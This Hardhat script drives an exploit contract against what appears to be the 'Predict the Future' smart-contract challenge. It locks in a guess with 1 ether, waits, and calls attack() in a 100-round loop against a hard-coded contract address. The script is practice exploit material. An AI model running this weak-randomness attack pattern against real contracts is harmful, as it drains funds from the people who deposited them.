import { ethers } from 'hardhat'

// async function main() {
//   const [owner] = await ethers.getSigners()
//   const PredictTheFutureExploit = await ethers.getContractFactory('PredictTheFutureExploit')
//   const predictTheFutureExploit = await PredictTheFutureExploit.deploy()
//   await predictTheFutureExploit.deployed()

//   const predictTheFutureExploitInterface = [
//     'function lockInGuess(uint8 n) external payable',
//     'function attack() external payable',
//   ]
//   const predictTheFutureExploitContract = await ethers.getContractAt(
//     predictTheFutureExploitInterface,
//     predictTheFutureExploit.address,
//     owner
//   )

// await predictTheFutureExploitContract.lockInGuess(0, {
//   value: ethers.utils.parseEther('1.0'),
// })

//     await predictTheFutureExploitContract.attack()
// }

function delay(time: number) {
  return new Promise((resolve) => setTimeout(resolve, time))
}

async function main() {
  const [owner] = await ethers.getSigners()
  const predictTheFutureExploitInterface = [
    'function attack() external payable',
    'function lockInGuess(uint8 n) external payable',
  ]
  const predictTheFutureExploitContract = await ethers.getContractAt(
    predictTheFutureExploitInterface,
    '0x0a252310c864c5503d76c4ec3af49a5bbd06c9ee',
    owner
  )
  for (let i = 0; i < 100; i++) {
    await predictTheFutureExploitContract.lockInGuess(0, {
      value: ethers.utils.parseEther('1.0'),
    })
    await delay(15000)
    await predictTheFutureExploitContract.attack({
      value: ethers.utils.parseEther('0.0001'),
    })
  }
}

main().catch((error) => {
  console.error(error)
  process.exitCode = 1
})
